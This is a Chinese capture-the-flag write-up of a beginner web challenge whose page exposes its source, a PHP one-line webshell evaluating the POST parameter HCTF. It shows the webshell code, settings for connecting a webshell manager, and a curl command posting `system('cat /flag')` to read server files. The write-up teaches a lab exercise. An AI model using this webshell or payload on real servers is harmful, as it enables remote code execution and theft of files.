# web_antshell —— Web 入门题（源码暴露 + 一句话木马连接）解题过程

> 玩家视角的第一人称解题记录。

## 0. 入场

打开题目链接，没有首页、没有登录框——整个站点就一个 `index.php`，
GET 访问直接回显它自己的源码：

```php
<?php
highlight_file(__FILE__);
@eval($_POST['HCTF']);
```

## 1. 读源码

两件事：

- `highlight_file(__FILE__)`：把自身源码高亮回显——这就是"源码暴露"本身；
- `@eval($_POST['HCTF'])`：把 POST 参数 `HCTF` 的值当 PHP 代码执行——
  经典一句话木马，连接密码（参数名）就是 `HCTF`。

## 2. WebShell 管理工具连接

一句话木马不挑管理工具，用任意 WebShell 管理器「添加数据」即可：

| 配置项 | 值 |
|---|---|
| URL 地址 | `http://<题目地址>/`（即 index.php，填 `/index.php` 亦可） |
| 连接密码 | `HCTF` |
| 连接类型 | PHP |

测试连接，基础信息（路径 / 系统 / 用户）正常返回，连接成功。

## 3. 拿 flag

题面说了 flag 在服务器的文件系统里：

- 虚拟终端：`cat /flag`
- 或文件管理器：进根目录，双击 `flag` 文件

得到 `hctf{...}`。

## 4. 后记

一句话木马本质是「把 POST 参数当代码执行」，不装管理工具手搓请求同样可行：
`curl -d "HCTF=system('cat /flag');" http://<题目地址>/`。
writeup 目录里的 exp.py 就是这个思路的 PoC：直接 POST 一段读 flag 的代码。
